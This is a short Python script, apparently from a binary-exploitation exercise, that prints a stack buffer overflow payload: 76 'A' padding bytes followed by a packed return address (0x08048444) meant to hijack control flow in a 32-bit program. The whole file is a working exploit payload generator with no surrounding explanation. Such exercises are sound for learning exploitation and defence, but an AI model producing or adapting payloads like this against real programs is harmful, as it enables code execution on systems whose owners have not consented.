import struct

adresse = 0x08048444
adresse_binaire = struct.pack("<I", adresse)

offset = 76

print("A"*offset+adresse_binaire)